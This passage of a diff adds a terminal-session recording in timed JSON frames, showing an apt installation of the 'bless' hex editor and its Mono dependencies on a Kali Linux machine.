+      "\u0008 \u0008"
+    ],
+    [
+      0.088365,
+      "s"
+    ],
+    [
+      0.088007,
+      "t"
+    ],
+    [
+      0.111824,
+      "a"
+    ],
+    [
+      0.112022,
+      "l"
+    ],
+    [
+      0.127994,
+      "l"
+    ],
+    [
+      0.480015,
+      " "
+    ],
+    [
+      0.360308,
+      "b"
+    ],
+    [
+      0.175727,
+      "e"
+    ],
+    [
+      0.328082,
+      "\u0008 \u0008"
+    ],
+    [
+      0.224005,
+      "l"
+    ],
+    [
+      0.040101,
+      "e"
+    ],
+    [
+      0.072106,
+      "s"
+    ],
+    [
+      0.191787,
+      "s"
+    ],
+    [
+      0.160648,
+      "\r\r\n"
+    ],
+    [
+      0.053641,
+      "sudo"
+    ],
+    [
+      0.000073,
+      ": "
+    ],
+    [
+      0.000033,
+      "unable to resolve host kali"
+    ],
+    [
+      0.000022,
+      "\r\n"
+    ],
+    [
+      0.060211,
+      "[sudo] password for miles: "
+    ],
+    [
+      2.230064,
+      "\r\n"
+    ],
+    [
+      0.031806,
+      "\rReading package lists... 0%\r"
+    ],
+    [
+      0.004665,
+      "\rReading package lists... 100%\r\rReading package lists... Done\r\r\n"
+    ],
+    [
+      0.003403,
+      "\rBuilding dependency tree... 0%\r"
+    ],
+    [
+      0.000089,
+      "\rBuilding dependency tree... 0%\r"
+    ],
+    [
+      0.037431,
+      "\rBuilding dependency tree... 50%\r"
+    ],
+    [
+      0.000090,
+      "\rBuilding dependency tree... 50%\r"
+    ],
+    [
+      0.138342,
+      "\rBuilding dependency tree       \r"
+    ],
+    [
+      0.000071,
+      "\r\n"
+    ],
+    [
+      0.000032,
+      "\rReading state information... 0%\r"
+    ],
+    [
+      0.001497,
+      "\rReading state information... 0%\r"
+    ],
+    [
+      0.005697,
+      "\rReading state information... Done\r"
+    ],
+    [
+      0.000066,
+      "\r\n"
+    ],
+    [
+      0.161294,
+      "The following packages were automatically installed and are no longer required:"
+    ],
+    [
+      0.000175,
+      "\r\n"
+    ],
+    [
+      0.000107,
+      "  genisoimage libadns1 msgpack-python nginx python-adns python-async python-bitarray python-bloomfilter python-bloomfiltermmap python-bs4"
+    ],
+    [
+      0.000062,
+      "\r\n"
+    ],
+    [
+      0.000053,
+      "  python-clamd python-cluster python-concurrent.futures python-d2to1 python-darts-lib-utils-lru python-easygui python-esmre python-git"
+    ],
+    [
+      0.000038,
+      "\r\n"
+    ],
+    [
+      0.000033,
+      "  python-gitdb python-guess-language python-halberd python-levenshtein python-mechanize python-metaconfig python-nltk python-ntlm"
+    ],
+    [
+      0.000025,
+      "\r\n"
+    ],
+    [
+      0.000041,
+      "  python-pdfminer python-pexpect python-phply python-ply python-pygithub python-pypdf python-smmap python-svn python-webkit sqlmap u3-tool"
+    ],
+    [
+      0.000025,
+      "\r\n"
+    ],
+    [
+      0.000028,
+      "  w3af-console wkhtmltopdf"
+    ],
+    [
+      0.000034,
+      "\r\n"
+    ],
+    [
+      0.000039,
+      "Use 'apt-get autoremove' to remove them."
+    ],
+    [
+      0.000031,
+      "\r\n"
+    ],
+    [
+      0.024093,
+      "The following extra packages will be installed:"
+    ],
+    [
+      0.000077,
+      "\r\n"
+    ],
+    [
+      0.000051,
+      "  cli-common docbook-xml libgdiplus libglade2.0-cil libglib2.0-cil libgtk2.0-cil libmono-cairo4.0-cil libmono-corlib4.0-cil"
+    ],
+    [
+      0.000028,
+      "\r\n"
+    ],
+    [
+      0.000039,
+      "  libmono-i18n-west4.0-cil libmono-i18n4.0-cil libmono-posix4.0-cil libmono-security4.0-cil libmono-system-configuration4.0-cil"
+    ],
+    [
+      0.000024,
+      "\r\n"
+    ],
+    [
+      0.000026,
+      "  libmono-system-drawing4.0-cil libmono-system-security4.0-cil libmono-system-xml4.0-cil libmono-system4.0-cil librarian0 mono-4.0-gac"
+    ],
+    [
+      0.000031,
+      "\r\n"
+    ],
+    [
+      0.000025,
+      "  mono-gac mono-runtime rarian-compat sgml-data"
+    ],
+    [
+      0.000021,
+      "\r\n"
+    ],
+    [
+      0.001026,
+      "Suggested packages:"
+    ],
+    [
+      0.007700,
+      "\r\n"
+    ],
+    [
+      0.000160,
+      "  docbook docbook-dsssl docbook-xsl docbook-defguide monodoc-gtk2.0-manual libmono-i18n4.0-all libgamin0 perlsgml w3-recs opensp"
+    ],
+    [
+      0.000064,
+      "\r\n"
+    ],
+    [
+      0.005603,
+      "The following NEW packages will be installed:"
+    ],
+    [
+      0.000109,
+      "\r\n"
+    ],
+    [
+      0.000046,
+      "  bless cli-common docbook-xml libgdiplus libglade2.0-cil libglib2.0-cil libgtk2.0-cil libmono-cairo4.0-cil libmono-corlib4.0-cil"
+    ],
+    [
+      0.000035,
+      "\r\n"
+    ],
+    [
+      0.000030,
+      "  libmono-i18n-west4.0-cil libmono-i18n4.0-cil libmono-posix4.0-cil libmono-security4.0-cil libmono-system-configuration4.0-cil"
+    ],
+    [
+      0.000022,
+      "\r\n"
+    ],
+    [
+      0.000035,
+      "  libmono-system-drawing4.0-cil libmono-system-security4.0-cil libmono-system-xml4.0-cil libmono-system4.0-cil librarian0 mono-4.0-gac"
+    ],
+    [
+      0.000022,
+      "\r\n"
+    ],
+    [
+      0.000024,
+      "  mono-gac mono-runtime rarian-compat sgml-data"
+    ],
+    [
+      0.000028,
+      "\r\n"
+    ],
+    [
+      0.008930,
+      "0 upgraded, 24 newly installed, 0 to remove and 236 not upgraded."
+    ],
+    [
+      0.000091,
+      "\r\n"
+    ],
+    [
+      0.036853,
+      "Need to get 7,262 kB of archives."
+    ],
+    [
+      0.000068,
+      "\r\n"
+    ],
+    [
+      0.000045,
+      "After this operation, 21.0 MB of additional disk space will be used."
+    ],
+    [
+      0.000023,
+      "\r\n"
+    ],
+    [
+      0.000049,
+      "Do you want to continue [Y/n]? "
+    ],
+    [
+      1.328814,
+      "Y"
+    ],
+    [
+      0.136443,
+      "\r\n"
+    ],
+    [
+      0.003122,
+      "\r\r0% [Working]"
+    ],
+    [
+      0.500827,
+      "\r            \r0% [Waiting for headers]"
+    ],
+    [
+      0.026265,
+      "\r0% [Waiting for headers]"
+    ],
+    [
+      0.198825,
+      "\r                        \r0% [Connecting to kali.localmsp.org (50.93.249.180)] [Waiting for headers]"
+    ],
+    [
+      0.205028,
+      "\r                                                                          \r0% [Waiting for headers] [Waiting for headers]"
+    ],
+    [
+      0.082865,
+      "\r                                              \rGet:1 http://http.kali.org/kali/ kali/main libmono-corlib4.0-cil all 2.10.8.1-8 [1,014 kB]\r\n\r                                              \r0% [1 libmono-corlib4.0-cil 0 B/1,014 kB 0%] [Waiting for headers]"
+    ],
+    [
+      0.120498,
+      "\r                                                                  \r1% [1 libmono-corlib4.0-cil 66.0 kB/1,014 kB 7%] [Waiting for headers]"
+    ],
+    [
+      0.207772,
+      "\r4% [1 libmono-corlib4.0-cil 287 kB/1,014 kB 28%] [Waiting for headers]"
+    ],
+    [
+      0.203964,
+      "\r7% [1 libmono-corlib4.0-cil 541 kB/1,014 kB 53%] [Waiting for headers]"
+    ],
+    [
+      0.204092,
+      "\r                                                                      \r10% [1 libmono-corlib4.0-cil 756 kB/1,014 kB 75%] [Waiting for headers]"
+    ],
+    [
+      0.204296,
+      "\r14% [1 libmono-corlib4.0-cil 993 kB/1,014 kB 98%] [Waiting for headers]"
+    ],
+    [
+      0.027602,
+      "\r                                                                       \r14% [Waiting for headers]"
+    ],
+    [
+      0.115823,
+      "\r                         \rGet:2 http://http.kali.org/kali/ kali/main libmono-system-xml4.0-cil all 2.10.8.1-8 [447 kB]\r\n\r                         \r14% [2 libmono-system-xml4.0-cil 0 B/447 kB 0%] [Waiting for headers]"
+    ],
+    [
+      0.057590,
+      "\r                                                                     \r15% [2 libmono-system-xml4.0-cil 72.9 kB/447 kB 16%] [Waiting for headers]"
+    ],
+    [
+      0.200889,
+      "\r                                                                          \r18% [2 libmono-system-xml4.0-cil 309 kB/447 kB 69%] [Waiting for headers]"
+    ],
+    [
+      0.145987,
+      "\r                                                                         \r20% [Waiting for headers]"
+    ],
+    [
+      0.055329,
+      "\r                         \r20% [Waiting for headers] [Waiting for headers]"
+    ],
+    [
+      0.018932,
+      "\r                                               \rGet:3 http://http.kali.org/kali/ kali/main libmono-system-security4.0-cil all 2.10.8.1-8 [70.2 kB]\r\n\r                                               \r20% [3 libmono-system-security4.0-cil 0 B/70.2 kB 0%] [Waiting for headers]"
+    ],
+    [
+      0.055350,
+      "\r                                                                           \r21% [Waiting for headers]"
+    ],
+    [
+      0.077679,
+      "\r                         \rGet:4 http://http.kali.org/kali/ kali/main libmono-system-configuration4.0-cil all 2.10.8.1-8 [67.6 kB]\r\n\r                         \r21% [4 libmono-system-configuration4.0-cil 2,513 B/67.6 kB 4%] [Waiting for headers]"
+    ],
+    [
+      0.048852,
+      "\r                                                                                    \r22% [4 libmono-system-configuration4.0-cil 64.6 kB/67.6 kB 96%] [Waiting for headers]"
+    ],
+    [
+      0.005504,
+      "\r                                                                                     \r22% [Waiting for headers]"
+    ],
+    [
+      0.098680,
+      "\r                         \rGet:5 http://http.kali.org/kali/ kali/main libmono-system4.0-cil all 2.10.8.1-8 [671 kB]\r\n\r                         \r22% [5 libmono-system4.0-cil 12.2 kB/671 kB 2%] [Waiting for headers]"
+    ],
+    [
+      0.097118,
+      "\r24% [5 libmono-system4.0-cil 124 kB/671 kB 18%] [Waiting for headers]"
+    ],
+    [
+      0.200748,
+      "\r27% [5 libmono-system4.0-cil 346 kB/671 kB 52%] [Waiting for headers]"
+    ],
+    [
+      0.200979,
+      "\r30% [5 libmono-system4.0-cil 577 kB/671 kB 86%] [Waiting for headers]"
+    ],
+    [
+      0.087486,
+      "\r                                                                     \r31% [Waiting for headers]"
+    ],
+    [
+      0.093468,
+      "\r                         \rGet:6 http://http.kali.org/kali/ kali/main libmono-security4.0-cil all 2.10.8.1-8 [135 kB]\r\n\r                         \r31% [6 libmono-security4.0-cil 0 B/135 kB 0%] [Waiting for headers]"
+    ],
+    [
+      0.020562,
+      "\r                                                                   \r32% [6 libmono-security4.0-cil 64.6 kB/135 kB 48%] [Waiting for headers]"
+    ],
+    [
+      0.101308,
+      "\r                                                                        \r33% [Waiting for headers]"
+    ],
+    [
+      0.099443,
+      "\r                         \r33% [Waiting for headers] [Waiting for headers]"
+    ],
+    [
+      0.003883,
+      "\r                                               \rGet:7 http://http.kali.org/kali/ kali/main mono-4.0-gac all 2.10.8.1-8 [28.5 kB]\r\n\r                                               \r33% [7 mono-4.0-gac 0 B/28.5 kB 0%] [Waiting for headers]"
+    ],
+    [
+      0.002761,
+      "\r                                                         \r34% [Waiting for headers]"
+    ],
+    [
+      0.057682,
+      "\r                         \rGet:8 http://http.kali.org/kali/ kali/main mono-gac all 2.10.8.1-8 [22.4 kB]\r\n\r                         \r34% [8 mono-gac 0 B/22.4 kB 0%] [Waiting for headers]"
+    ],
+    [
+      0.001255,
+      "\r                                                     \r34% [Waiting for headers]"
+    ],
+    [
+      0.135423,
+      "\r                         \r34% [Waiting for headers] [Waiting for headers]"
+    ],
+    [
+      0.022474,
+      "\r                                               \rGet:9 http://http.kali.org/kali/ kali/main mono-runtime amd64 2.10.8.1-8 [1,610 kB]\r\n\r                                               \r34% [9 mono-runtime 12.2 kB/1,610 kB 1%] [Waiting for headers]"
+    ],
+    [
+      0.178363,
+      "\r37% [9 mono-runtime 207 kB/1,610 kB 13%] [Waiting for headers]"
+    ],
+    [
+      0.202234,
+      "\r39% [9 mono-runtime 380 kB/1,610 kB 24%] [Waiting for headers]"
+    ],
+    [
+      0.201374,
+      "\r42% [9 mono-runtime 572 kB/1,610 kB 36%] [Waiting for headers]"
+    ],
+    [
+      0.200614,
+      "\r45% [9 mono-runtime 778 kB/1,610 kB 48%] [Waiting for headers]"
+    ],
+    [
+      0.201203,
+      "\r                                                              \r48% [9 mono-runtime 1,017 kB/1,610 kB 63%] [Waiting for headers]"
+    ],
+    [
+      0.200727,
+      "\r                                                                \r51% [9 mono-runtime 1,235 kB/1,610 kB 77%]"
+    ],
+    [
+      0.341997,
+      "\r                                          \r56% [Working]"
+    ],
+    [
+      0.064397,
+      "\r             \rGet:10 http://http.kali.org/kali/ kali/main cli-common all 0.8.2 [178 kB]\r\n\r             \r56% [10 cli-common 0 B/178 kB 0%]"
+    ],
+    [
+      0.122000,
+      "\r                                 \r58% [Working]"
+    ],
+    [
+      0.078302,
+      "\r             \rGet:11 http://http.kali.org/kali/ kali/main libglib2.0-cil amd64 2.12.10-5 [187 kB]\r\n\r             \r58% [11 libglib2.0-cil 0 B/187 kB 0%]"
+    ],
+    [
+      0.118944,
+      "\r                                     \r61% [Working]"
+    ],
+    [
+      0.093097,
+      "\r             \rGet:12 http://http.kali.org/kali/ kali/main libmono-cairo4.0-cil all 2.10.8.1-8 [38.9 kB]\r\n\r             \r61% [12 libmono-cairo4.0-cil 0 B/38.9 kB 0%]"
+    ],
+    [
+      0.002866,
+      "\r                                            \r62% [Working]"
+    ],
+    [
+      0.063009,
+      "\r             \rGet:13 http://http.kali.org/kali/ kali/main libgdiplus amd64 2.10-3+b1 [172 kB]\r\n\r             \r62% [13 libgdiplus 2,512 B/172 kB 1%]                                                                                           738 kB/s 3s"
+    ],
+    [
+      0.126114,
+      "\r64% [Working]                                                                                                                   738 kB/s 3s"
+    ],
+    [
+      0.104216,
+      "\r                                                                                                                                           \rGet:14 http://http.kali.org/kali/ kali/main libmono-system-drawing4.0-cil all 2.10.8.1-8 [175 kB]\r\n\r64% [14 libmono-system-drawing4.0-cil 0 B/175 kB 0%]                                                                            738 kB/s 3s"
+    ],
+    [
+      0.121761,
+      "\r66% [Working]                                                                                                                   738 kB/s 3s"
+    ],
+    [
+      0.057598,
+      "\r                                                                                                                                           \rGet:15 http://http.kali.org/kali/ kali/main libgtk2.0-cil amd64 2.12.10-5 [766 kB]\r\n\r66% [15 libgtk2.0-cil 0 B/766 kB 0%]                                                                                            738 kB/s 3s"
+    ],
+    [
+      0.500719,
+      "\r74% [15 libgtk2.0-cil 568 kB/766 kB 74%]                                                                                        738 kB/s 2s"
+    ],
+    [
+      0.168649,
+      "\r77% [Working]                                                                                                                   738 kB/s 2s"
+    ],
+    [
+      0.059376,
+      "\r                                                                                                                                           \rGet:16 http://http.kali.org/kali/ kali/main libglade2.0-cil amd64 2.12.10-5 [160 kB]\r\n\r77% [16 libglade2.0-cil 0 B/160 kB 0%]                                                                                          738 kB/s 2s"
+    ],
+    [
+      0.127461,
+      "\r79% [Working]                                                                                                                   738 kB/s 2s"
+    ],
+    [
+      0.072972,
+      "\r                                                                                                                                           \rGet:17 http://http.kali.org/kali/ kali/main libmono-posix4.0-cil all 2.10.8.1-8 [92.9 kB]\r\n\r79% [17 libmono-posix4.0-cil 0 B/92.9 kB 0%]                                                                                    738 kB/s 2s"
+    ],
+    [
+      0.069084,
+      "\r80% [Working]                                                                                                                   738 kB/s 1s"
+    ],
+    [
+      0.058052,
+      "\r                                                                                                                                           \rGet:18 http://http.kali.org/kali/ kali/main librarian0 amd64 0.8.1-5 [73.1 kB]\r\n\r80% [18 librarian0 0 B/73.1 kB 0%]                                                                                              738 kB/s 1s"
+    ],
+    [
+      0.057554,
+      "\r81% [Working]                                                                                                                   738 kB/s 1s"
+    ],
+    [
+      0.061763,
+      "\r                                                                                                                                           \rGet:19 http://http.kali.org/kali/ kali/main sgml-data all 2.0.8 [284 kB]\r\n\r82% [19 sgml-data 12.2 kB/284 kB 4%]                                                                                            738 kB/s 1s"
+    ],
+    [
+      0.241351,
+      "\r85% [Working]                                                                                                                   738 kB/s 1s"
+    ],
+    [
+      0.058518,
+      "\r                                                                                                                                           \rGet:20 http://http.kali.org/kali/ kali/main docbook-xml all 4.5-7.2 [347 kB]\r\n\r85% [20 docbook-xml 0 B/347 kB 0%]                                                                                              738 kB/s 1s"
+    ],
+    [
+      0.341352,
+      "\r90% [Working]                                                                                                                   738 kB/s 0s"
+    ],
+    [
+      0.057230,
+      "\r                                                                                                                                           \rGet:21 http://http.kali.org/kali/ kali/main rarian-compat amd64 0.8.1-5 [130 kB]\r\n\r90% [21 rarian-compat 0 B/130 kB 0%]                                                                                            738 kB/s 0s"
+    ],
+    [
+      0.129331,
+      "\r92% [Working]                                                                                                                   738 kB/s 0s"
+    ],
+    [
+      0.083672,
+      "\r                                                                                                                                           \rGet:22 http://http.kali.org/kali/ kali/main bless all 0.6.0-4 [527 kB]\r\n\r92% [22 bless 0 B/527 kB 0%]                                                                                                    738 kB/s 0s"
+    ],
+    [
+      0.500583,
+      "\r99% [Working]                                                                                                                   738 kB/s 0s"
+    ],
+    [
+      0.094955,
+      "\r                                                                                                                                           \rGet:23 http://http.kali.org/kali/ kali/main libmono-i18n4.0-cil all 2.10.8.1-8 [28.3 kB]\r\n\r99% [23 libmono-i18n4.0-cil 0 B/28.3 kB 0%]                                                                                     738 kB/s 0s"
+    ],
+    [
+      0.003000,
+      "\r99% [Working]                                                                                                                   738 kB/s 0s"
+    ],
+    [
+      0.118810,
+      "\r                                                                                                                                           \rGet:24 http://http.kali.org/kali/ kali/main libmono-i18n-west4.0-cil all 2.10.8.1-8 [36.5 kB]\r\n\r100% [Working]                                                                                                                  738 kB/s 0s\r                                                                                                                                           \rFetched 7,262 kB in 9s (783 kB/s)\r\n"
+    ],
+    [
+      0.787014,
+      "Selecting previously unselected package libmono-corlib4.0-cil."
+    ],
+    [
+      0.000131,
+      "\r\n"
+    ],
+    [
+      0.000049,
+      "(Reading database ... \r"
+    ],
+    [
+      0.086888,
+      "(Reading database ... 5%\r"
+    ],
+    [
+      0.000121,
+      "(Reading database ... 10%\r"
+    ],
+    [
+      0.000068,
+      "(Reading database ... 15%\r"
+    ],
+    [
+      0.000057,
+      "(Reading database ... 20%\r"
+    ],
+    [
+      0.000052,
+      "(Reading database ... 25%\r"
+    ],
+    [
+      0.000056,
+      "(Reading database ... 30%\r"
+    ],
+    [
+      0.000068,
+      "(Reading database ... 35%\r"
+    ],
+    [
+      0.000055,
+      "(Reading database ... 40%\r"
+    ],
+    [
+      0.000058,
+      "(Reading database ... 45%\r"
+    ],
+    [
+      0.000063,
+      "(Reading database ... 50%\r"
+    ],
+    [
+      0.084191,
+      "(Reading database ... 55%\r"
+    ],
+    [
+      0.076497,
+      "(Reading database ... 60%\r"
+    ],
+    [
+      0.066322,
+      "(Reading database ... 65%\r"
+    ],
+    [
+      0.106514,
+      "(Reading database ... 70%\r"
+    ],
+    [
+      0.132055,
+      "(Reading database ... 75%\r"
+    ],
+    [
+      0.143287,
+      "(Reading database ... 80%\r"
+    ],
+    [
+      0.083963,
+      "(Reading database ... 85%\r"
+    ],
+    [
+      0.075245,
+      "(Reading database ... 90%\r"
+    ],
+    [
+      0.096875,
+      "(Reading database ... 95%\r"
+    ],
+    [
+      0.307735,
+      "(Reading database ... 100%\r"
+    ],
+    [
+      0.000101,
+      "(Reading database ... "
+    ],
+    [
+      0.000056,
+      "300965 files and directories currently installed.)"
+    ],
+    [
+      0.000039,
+      "\r\n"
+    ],
+    [
+      0.047856,
+      "Unpacking libmono-corlib4.0-cil (from .../libmono-corlib4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000076,
+      "\r\n"
+    ],
+    [
+      0.196735,
+      "Selecting previously unselected package libmono-system-xml4.0-cil.\r\n"
+    ],
+    [
+      0.060705,
+      "Unpacking libmono-system-xml4.0-cil (from .../libmono-system-xml4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000105,
+      "\r\n"
+    ],
+    [
+      0.062552,
+      "Selecting previously unselected package libmono-system-security4.0-cil.\r\n"
+    ],
+    [
+      0.064470,
+      "Unpacking libmono-system-security4.0-cil (from .../libmono-system-security4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000088,
+      "\r\n"
+    ],
+    [
+      0.061151,
+      "Selecting previously unselected package libmono-system-configuration4.0-cil.\r\n"
+    ],
+    [
+      0.061671,
+      "Unpacking libmono-system-configuration4.0-cil (from .../libmono-system-configuration4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000100,
+      "\r\n"
+    ],
+    [
+      0.054582,
+      "Selecting previously unselected package libmono-system4.0-cil."
+    ],
+    [
+      0.000070,
+      "\r\n"
+    ],
+    [
+      0.058429,
+      "Unpacking libmono-system4.0-cil (from .../libmono-system4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000087,
+      "\r\n"
+    ],
+    [
+      0.080091,
+      "Selecting previously unselected package libmono-security4.0-cil."
+    ],
+    [
+      0.000076,
+      "\r\n"
+    ],
+    [
+      0.059704,
+      "Unpacking libmono-security4.0-cil (from .../libmono-security4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000064,
+      "\r\n"
+    ],
+    [
+      0.052835,
+      "Selecting previously unselected package mono-4.0-gac.\r\n"
+    ],
+    [
+      0.061060,
+      "Unpacking mono-4.0-gac (from .../mono-4.0-gac_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000106,
+      "\r\n"
+    ],
+    [
+      0.047781,
+      "Selecting previously unselected package mono-gac."
+    ],
+    [
+      0.000109,
+      "\r\n"
+    ],
+    [
+      0.087134,
+      "Unpacking mono-gac (from .../mono-gac_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000103,
+      "\r\n"
+    ],
+    [
+      0.074135,
+      "Selecting previously unselected package mono-runtime."
+    ],
+    [
+      0.000076,
+      "\r\n"
+    ],
+    [
+      0.061448,
+      "Unpacking mono-runtime (from .../mono-runtime_2.10.8.1-8_amd64.deb) ..."
+    ],
+    [
+      0.000091,
+      "\r\n"
+    ],
+    [
+      0.151502,
+      "Selecting previously unselected package cli-common.\r\n"
+    ],
+    [
+      0.061363,
+      "Unpacking cli-common (from .../cli-common_0.8.2_all.deb) ..."
+    ],
+    [
+      0.000206,
+      "\r\n"
+    ],
+    [
+      0.058925,
+      "Selecting previously unselected package libglib2.0-cil."
+    ],
+    [
+      0.000169,
+      "\r\n"
+    ],
+    [
+      0.070200,
+      "Unpacking libglib2.0-cil (from .../libglib2.0-cil_2.12.10-5_amd64.deb) ..."
+    ],
+    [
+      0.000103,
+      "\r\n"
+    ],
+    [
+      0.052507,
+      "Selecting previously unselected package libmono-cairo4.0-cil."
+    ],
+    [
+      0.000119,
+      "\r\n"
+    ],
+    [
+      0.066735,
+      "Unpacking libmono-cairo4.0-cil (from .../libmono-cairo4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000102,
+      "\r\n"
+    ],
+    [
+      0.048447,
+      "Selecting previously unselected package libgdiplus."
+    ],
+    [
+      0.000074,
+      "\r\n"
+    ],
+    [
+      0.065632,
+      "Unpacking libgdiplus (from .../libgdiplus_2.10-3+b1_amd64.deb) ..."
+    ],
+    [
+      0.000077,
+      "\r\n"
+    ],
+    [
+      0.056085,
+      "Selecting previously unselected package libmono-system-drawing4.0-cil.\r\n"
+    ],
+    [
+      0.056754,
+      "Unpacking libmono-system-drawing4.0-cil (from .../libmono-system-drawing4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000085,
+      "\r\n"
+    ],
+    [
+      0.053083,
+      "Selecting previously unselected package libgtk2.0-cil."
+    ],
+    [
+      0.000103,
+      "\r\n"
+    ],
+    [
+      0.060769,
+      "Unpacking libgtk2.0-cil (from .../libgtk2.0-cil_2.12.10-5_amd64.deb) ..."
+    ],
+    [
+      0.000108,
+      "\r\n"
+    ],
+    [
+      0.087909,
+      "Selecting previously unselected package libglade2.0-cil."
+    ],
+    [
+      0.000106,
+      "\r\n"
+    ],
+    [
+      0.067317,
+      "Unpacking libglade2.0-cil (from .../libglade2.0-cil_2.12.10-5_amd64.deb) ..."
+    ],
+    [
+      0.000104,
+      "\r\n"
+    ],
+    [
+      0.049672,
+      "Selecting previously unselected package libmono-posix4.0-cil.\r\n"
+    ],
+    [
+      0.060608,
+      "Unpacking libmono-posix4.0-cil (from .../libmono-posix4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000125,
+      "\r\n"
+    ],
+    [
+      0.049577,
+      "Selecting previously unselected package librarian0."
+    ],
+    [
+      0.000946,
+      "\r\n"
+    ],
+    [
+      0.151831,
+      "Unpacking librarian0 (from .../librarian0_0.8.1-5_amd64.deb) ..."
+    ],
+    [
+      0.101533,
+      "\r\n"
+    ],
+    [
+      0.171406,
+      "Selecting previously unselected package sgml-data.\r\n"
+    ],
+    [
+      0.126728,
+      "Unpacking sgml-data (from .../sgml-data_2.0.8_all.deb) ..."
+    ],
+    [
+      0.003207,
+      "\r\n"
+    ],
+    [
+      0.190040,
+      "Selecting previously unselected package docbook-xml.\r\n"
+    ],
+    [
+      0.091581,
+      "Unpacking docbook-xml (from .../docbook-xml_4.5-7.2_all.deb) ..."
+    ],
+    [
+      0.000112,
+      "\r\n"
+    ],
+    [
+      0.128651,
+      "Selecting previously unselected package rarian-compat."
+    ],
+    [
+      0.000202,
+      "\r\n"
+    ],
+    [
+      0.065293,
+      "Unpacking rarian-compat (from .../rarian-compat_0.8.1-5_amd64.deb) ..."
+    ],
+    [
+      0.000098,
+      "\r\n"
+    ],
+    [
+      0.066048,
+      "Selecting previously unselected package bless.\r\n"
+    ],
+    [
+      0.060963,
+      "Unpacking bless (from .../archives/bless_0.6.0-4_all.deb) ..."
+    ],
+    [
+      0.000089,
+      "\r\n"
+    ],
+    [
+      0.173341,
+      "Selecting previously unselected package libmono-i18n4.0-cil."
+    ],
+    [
+      0.000104,
+      "\r\n"
+    ],
+    [
+      0.065900,
+      "Unpacking libmono-i18n4.0-cil (from .../libmono-i18n4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.000083,
+      "\r\n"
+    ],
+    [
+      0.082833,
+      "Selecting previously unselected package libmono-i18n-west4.0-cil.\r\n"
+    ],
+    [
+      0.101675,
+      "Unpacking libmono-i18n-west4.0-cil (from .../libmono-i18n-west4.0-cil_2.10.8.1-8_all.deb) ..."
+    ],
+    [
+      0.006992,
+      "\r\n"
+    ],
+    [
+      0.049876,
+      "Processing triggers for man-db ...\r\n"
+    ],
+    [
+      0.912386,
+      "Processing triggers for desktop-file-utils ...\r\n"
+    ],
+    [
+      0.186004,
+      "Processing triggers for gnome-menus ...\r\n"
+    ],
+    [
+      0.087528,
+      "Processing triggers for sgml-base ..."
+    ],
+    [
+      0.005928,
+      "\r\n"
+    ],
+    [
+      0.670121,
+      "Setting up cli-common (0.8.2) ..."
+    ],
+    [
+      0.000089,
+      "\r\n"
+    ],
+    [
+      0.014181,
+      "Setting up libgdiplus (2.10-3+b1) ..."
+    ],
+    [
+      0.000068,
+      "\r\n"
+    ],
+    [
+      0.143499,
+      "Setting up librarian0 (0.8.1-5) ...\r\n"
+    ],
+    [
+      0.041198,
+      "Setting up sgml-data (2.0.8) ...\r\n"
+    ],
+    [
+      0.306171,
+      "Processing triggers for sgml-base ...\r\n"
+    ],
+    [
+      0.009742,
+      "Setting up docbook-xml (4.5-7.2) ...\r\n"
+    ],
+    [
+      1.129199,
+      "Processing triggers for sgml-base ...\r\n"
+    ],
+    [
+      0.008887,
+      "Setting up rarian-compat (0.8.1-5) ...\r\n"
+    ],
+    [
+      0.069240,
+      "Setting up mono-4.0-gac (2.10.8.1-8) ..."
+    ],
+    [
+      0.000106,
+      "\r\n"
+    ],
+    [
+      0.003888,
+      "Setting up mono-gac (2.10.8.1-8) ..."
+    ],
+    [
+      0.000073,
+      "\r\n"
+    ],
+    [
+      0.055478,
+      "* Installing 1 assembly from libglade2.0-cil into Mono\r\n"
+    ],
+    [
+      0.140951,
+      "* Installing 1 assembly from libglib2.0-cil into Mono\r\n"
+    ],
+    [
+      0.122924,
+      "* Installing 5 assemblies from libgtk2.0-cil into Mono\r\n"
+    ],
+    [
+      0.581984,
+      "update-alternatives: "
+    ],
+    [
+      0.000106,
+      "using /usr/bin/gacutil to provide /usr/bin/cli-gacutil (global-assembly-cache-tool) in auto mode"
+    ],
+    [
+      0.000037,
+      "\r\n"
+    ],
+    [
+      0.008268,
+      "Setting up mono-runtime (2.10.8.1-8) ..."
+    ],
+    [
+      0.000312,
+      "\r\n"
+    ],
+    [
+      0.044658,
+      "update-alternatives: "
+    ],
+    [
+      0.000068,
+      "using /usr/bin/mono to provide /usr/bin/cli (cli) in auto mode"
+    ],
+    [
+      0.000038,
+      "\r\n"
+    ],
+    [
+      0.053614,
+      "Setting up libmono-corlib4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000210,
+      "\r\n"
+    ],
+    [
+      0.011639,
+      "Setting up libmono-cairo4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000052,
+      "\r\n"
+    ],
+    [
+      0.033366,
+      "Setting up libmono-i18n4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000098,
+      "\r\n"
+    ],
+    [
+      0.018094,
+      "Setting up libmono-i18n-west4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000126,
+      "\r\n"
+    ],
+    [
+      0.004717,
+      "Setting up libmono-security4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.002374,
+      "\r\n"
+    ],
+    [
+      0.004823,
+      "Setting up libmono-system-xml4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000075,
+      "\r\n"
+    ],
+    [
+      0.028239,
+      "Setting up libmono-system-security4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000085,
+      "\r\n"
+    ],
+    [
+      0.004327,
+      "Setting up libmono-system-configuration4.0-cil (2.10.8.1-8) ..."
+    ],
+    [
+      0.000076,
+      "\r\n"
+    ],
+    [
+      0.003512,
